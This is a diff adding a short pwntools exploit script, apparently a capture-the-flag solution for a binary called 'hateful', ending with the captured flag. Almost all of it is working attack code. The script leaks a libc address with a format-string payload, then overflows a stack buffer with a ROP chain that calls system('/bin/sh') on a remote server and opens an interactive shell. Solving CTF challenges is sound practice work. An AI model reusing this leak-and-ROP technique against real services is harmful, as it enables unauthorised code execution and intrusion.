@@ -1,0 +1,36 @@
+from pwn import *
+
+e = ELF("./hateful_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+
+script = '''
+b *main
+b *0x40122E
+b *send_message + 163
+'''
+
+p = remote("52.59.124.14", 5020)
+#p = process("./hateful_patched")
+#p = gdb.debug("./hateful_patched", gdbscript = script)
+
+p.sendlineafter(b">> ", b"yay")
+
+payload = b"%151$p"
+p.sendlineafter(b">> ", payload)
+p.recvuntil(b"email provided: ")
+libc_base = int(p.recvline(), 16) - 0x2724a
+print(hex(libc_base))
+system = libc_base + libc.symbols['system']
+binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
+pop_rdi = libc_base + 0x00000000000277e5
+ret = pop_rdi + 1
+
+payload = b"A" * 0x3F0
+payload += p64(0) + p64(pop_rdi)
+payload += p64(binsh) + p64(ret)
+payload += p64(system)
+p.sendlineafter(b"message!\n", payload)
+
+p.interactive()
+#ENO{W3_4R3_50RRY_TH4T_TH3_M3554G3_W45_N0T_53NT_T0_TH3_R1GHT_3M41L}
